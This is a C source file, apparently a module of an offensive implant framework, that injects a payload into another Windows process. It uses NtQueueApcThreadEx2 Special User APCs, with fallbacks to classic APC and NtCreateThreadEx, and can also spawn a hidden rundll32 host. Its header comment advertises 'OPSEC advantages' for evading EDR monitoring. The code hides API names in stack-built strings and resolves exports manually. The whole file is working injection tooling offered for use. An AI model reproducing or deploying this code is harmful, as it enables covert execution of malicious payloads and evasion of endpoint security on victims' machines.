// apc_ex2 -- Process injection via NtQueueApcThreadEx2 (Special User APC).
//
// Technique:
//   1. Allocate + write + protect in target
//   2. Open any thread of the target process
//   3. Call NtQueueApcThreadEx2 with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
//   4. APC fires immediately -- no alertable wait required
//
// Background:
//   Classic NtQueueApcThread requires the target thread to enter alertable
//   wait (SleepEx, WaitForSingleObjectEx, etc.) before the APC fires.
//   NtQueueApcThreadEx2 (Windows 10 19041+) introduces "Special User APC"
//   which fires at the next thread scheduling point, regardless of alertable
//   state. This is the same mechanism used internally by the Windows Thread Pool.
//
// OPSEC advantages:
//   - No new thread created (no NtCreateThreadEx / CreateRemoteThread)
//   - No kernel thread-creation callback fired
//   - Works on ANY thread (no alertable wait requirement)
//   - Execution looks like normal APC dispatch from kernel perspective
//   - Less monitored than NtCreateThreadEx by most EDRs (2026)
//   - Call stack shows KiUserApcDispatcher -> our code (normal APC path)
//
// Requirements: Windows 10 2004 (build 19041) or later.
// On older systems, falls back to classic NtQueueApcThread (requires alertable).

#include "../../process_inject_api.h"

// Forward declarations.
static int   pic_strcmp(const char* a, const char* b);
static void* pic_get_proc(void* module_base, const char* func_name);
static void  pic_memset(void* dst, int val, uint32_t len);
static uint32_t do_apc_ex2(InjectCtx* ctx, HANDLE hp, DWORD pid);
static uint32_t do_spawn(InjectCtx* ctx);

typedef NTSTATUS (__stdcall *pfn_NtQueueApcThreadEx2)(
    HANDLE Thread, HANDLE Reserve, ULONG Flags,
    PVOID ApcRoutine, PVOID Arg1, PVOID Arg2, PVOID Arg3);

// ---- ENTRY POINT (must be first defined function) -------------------------

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    if (ctx->method_hint == INJECT_METHOD_SPAWN || !ctx->target_process)
        return do_spawn(ctx);
    return do_apc_ex2(ctx, ctx->target_process, ctx->target_pid);
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static uint32_t do_apc_ex2(InjectCtx* ctx, HANDLE hp, DWORD pid) {
    // 1. Alloc + write + protect.
    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(hp, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) return INJECT_ERR_ALLOC;

    SIZE_T written = 0;
    ctx->NtWriteVirtualMemory(hp, base, (PVOID)ctx->payload, (SIZE_T)ctx->payload_len, &written);

    PVOID pb = base; SIZE_T ps = (SIZE_T)ctx->payload_len; ULONG old = 0;
    ctx->NtProtectVirtualMemory(hp, &pb, &ps, 0x20, &old);
    ctx->out_remote_base = base;

    // 2. Resolve NtQueueApcThreadEx2.
    char s_ex2[] = {'N','t','Q','u','e','u','e','A','p','c',
                    'T','h','r','e','a','d','E','x','2',0};
    pfn_NtQueueApcThreadEx2 NtQueueApcThreadEx2 =
        (pfn_NtQueueApcThreadEx2)pic_get_proc(ctx->ntdll_base, s_ex2);

    // 3. Find a thread.
    HANDLE snap = ctx->CreateToolhelp32Snapshot(0x00000004, 0);
    if (!snap || snap == (HANDLE)(LONG_PTR)-1) goto fallback_thread;

    typedef struct {
        DWORD dwSize; DWORD cntUsage; DWORD th32ThreadID;
        DWORD th32OwnerProcessID; LONG tpBasePri; LONG tpDeltaPri; DWORD dwFlags;
    } TE32;
    TE32 te;
    te.dwSize = sizeof(te);

    // Пробуем все потоки -- сначала через Ex2, если не доступен -- классический APC.
    int success = 0;
    if (ctx->Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE hth = ctx->OpenThread(0x0010, FALSE, te.th32ThreadID);
            if (!hth) continue;

            if (NtQueueApcThreadEx2) {
                // Special User APC: флаг 1 = fires without alertable wait.
                ns = NtQueueApcThreadEx2(hth, NULL, 1, base, NULL, NULL, NULL);
                if (ns >= 0) { success = 1; ctx->CloseHandle(hth); break; }
            }

            // Fallback: classic APC (requires alertable state).
            ns = ctx->NtQueueApcThread(hth, base, NULL, NULL, NULL);
            if (ns >= 0) ++success;
            ctx->CloseHandle(hth);
        } while (ctx->Thread32Next(snap, &te));
    }
    ctx->CloseHandle(snap);

    if (success > 0) return INJECT_OK;

fallback_thread:
    // Fallback: NtCreateThreadEx.
    {
        HANDLE hth = NULL;
        ns = ctx->NtCreateThreadEx(&hth, 0x1FFFFF, NULL, hp, base, NULL, 0, 0, 0, 0, NULL);
        if (ns < 0 || !hth) return INJECT_ERR_THREAD;
        ctx->out_thread = hth;
    }
    return INJECT_OK;
}

static uint32_t do_spawn(InjectCtx* ctx) {
    uint16_t default_spawn[] = {
        'C',':','\\','W','i','n','d','o','w','s','\\',
        'S','y','s','t','e','m','3','2','\\',
        'r','u','n','d','l','l','3','2','.','e','x','e',0
    };
    uint16_t* cmd = (uint16_t*)ctx->spawn_to;
    if (!cmd || !cmd[0]) cmd = default_spawn;

    typedef struct {
        DWORD  cb; void* r1; void* r2; void* r3;
        DWORD  dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize;
        DWORD  dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute;
        DWORD  dwFlags; uint16_t wShowWindow; uint16_t cbReserved2;
        void*  lpReserved2;
        HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;
    } SIW;
    typedef struct {
        HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;
    } PIW;

    SIW si; pic_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x00000001;
    si.wShowWindow = 0;

    PIW pi; pic_memset(&pi, 0, sizeof(pi));

    // Не suspend: нужен живой поток для APC.
    BOOL ok = ctx->CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                                  0x08000000, NULL, NULL, &si, &pi);
    if (!ok) return INJECT_ERR_PROCESS;

    uint32_t result = do_apc_ex2(ctx, pi.hProcess, pi.dwProcessId);
    if (result != INJECT_OK) {
        ctx->TerminateProcess(pi.hProcess, 1);
        ctx->CloseHandle(pi.hThread);
        ctx->CloseHandle(pi.hProcess);
        return result;
    }

    ctx->out_process = pi.hProcess;
    ctx->CloseHandle(pi.hThread);
    return INJECT_OK;
}

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void* pic_get_proc(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;
    typedef struct { uint16_t e_magic; uint8_t pad[58]; uint32_t e_lfanew; } DOS_H;
    DOS_H* dos = (DOS_H*)base;
    unsigned char* nt = base + dos->e_lfanew;
    uint16_t magic = *(uint16_t*)(nt + 24);
    uint32_t exp_rva;
    if (magic == 0x20b)
        exp_rva = *(uint32_t*)(nt + 24 + 112);
    else
        exp_rva = *(uint32_t*)(nt + 24 + 96);
    if (!exp_rva) return 0;
    unsigned char* exp = base + exp_rva;
    uint32_t num_names = *(uint32_t*)(exp + 24);
    uint32_t* names    = (uint32_t*)(base + *(uint32_t*)(exp + 32));
    uint16_t* ords     = (uint16_t*)(base + *(uint32_t*)(exp + 36));
    uint32_t* funcs    = (uint32_t*)(base + *(uint32_t*)(exp + 28));
    for (uint32_t i = 0; i < num_names; ++i) {
        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
            return (void*)(base + funcs[ords[i]]);
    }
    return 0;
}

static void pic_memset(void* dst, int val, uint32_t len) {
    volatile uint8_t* d = (volatile uint8_t*)dst;
    for (uint32_t i = 0; i < len; ++i) d[i] = (uint8_t)val;
}
